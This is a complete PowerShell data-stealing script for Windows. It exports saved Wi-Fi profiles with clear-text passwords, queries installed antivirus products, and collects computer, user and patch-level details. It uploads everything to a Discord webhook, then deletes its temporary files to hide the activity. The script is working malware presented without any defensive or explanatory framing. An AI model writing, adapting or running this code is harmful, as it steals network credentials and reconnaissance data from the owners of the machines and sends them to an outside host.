# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (Test-Path -Path "C:\temp" -PathType Container) {
        # The folder exists

        # Check if the current directory is C:\temp
        if (-not (Get-Location).Path -eq "C:\temp") {
            # If not, change the directory
            Set-Location -Path "C:\temp"
        }
    } else {
        # The folder does not exist, create it, and change the directory
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
        Set-Location -Path "C:\temp"
    }
}

# Function to upload content to Discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

# Script block for the Exfiltration function
function Exflitration {
    # Get desktop path
    $desktop = [Environment]::GetFolderPath("Desktop")

    # Call version-av function
    version-av

    # Call Wifi function
    Wifi

    # Call SysInfo function
    SysInfo
}

# Function to get the antivirus version
function version-av {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8

    # Upload AntiSpyware.txt to Discord
    Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"

    # Return to C:\temp folder
    cd C:\
    rmdir -R \temp
}

# Function to retrieve Wi-Fi information
function Wifi {
    # Create the temporary wifi folder in C:\temp
    New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
    Set-Location -Path "C:\temp\wifi"

    # Export Wi-Fi profiles
    netsh wlan export profile key=clear

    # Modify paths in the file and save the result to wifi.txt
    Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
        $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
    } | Out-File -FilePath "wifi.txt" -Encoding utf8

    # Upload wifi.txt to Discord
    Upload-Discord -file "wifi.txt" -text "Wifi password :"

    # Return to the C:\temp directory
    Set-Location -Path "C:\temp"

    # Delete the temporary wifi folder
    Remove-Item -Path "C:\temp\wifi" -Force -Recurse
}

# Function to get system information
function SysInfo {
    # Get desktop path
    $desktop = ([Environment]::GetFolderPath("Desktop"))

    # Get user information
    $date = Get-Date -UFormat "%d-%m-%Y_%H-%M-%S"
    $namepc = $env:computername
    $user = $env:UserName
    $userInfo = "Computer Name : $namepc`r`nUser : $user`r`nDate : $date"
    $userInfo | Out-File -FilePath "C:\Temp\UserInfo.txt" -Encoding utf8

    # Get computer information
    Get-ComputerInfo | Out-File -FilePath "C:\Temp\ComputerInfo.txt" -Encoding utf8

    # Generate a report of updates installed on the computer
    $userDir = "C:\Temp"
    $fileSaveDir = New-Item -Path $userDir -ItemType Directory -Force
    $date = Get-Date
    $Report = "Update Report`r`n`r`nGenerated on: $Date`r`n`r`nInstalled Updates:`r`n"

    $UpdatesInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | Sort-Object -Property InstalledOn -Descending
    foreach ($Update in $UpdatesInfo) {
        $Report += "Description: $($Update.Description)`r`nHotFixId: $($Update.HotFixId)`r`nInstalledOn: $($Update.InstalledOn)`r`nInstalledBy: $($Update.InstalledBy)`r`n`r`n"
    }

    $Report | Out-File -FilePath "$userDir\WinUpdates.txt" -Encoding utf8

    # Upload files to Discord via the Upload-Discord function
    Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
    Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
    Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
}

# Function to delete the temporary directory
function DelTempDir {
    cd C:\
    rmdir -R \temp
    exit
}

# Call the TempDir function
TempDir

# Call the Exflitration function
Exflitration

# Call the DelTempDir function
DelTempDir
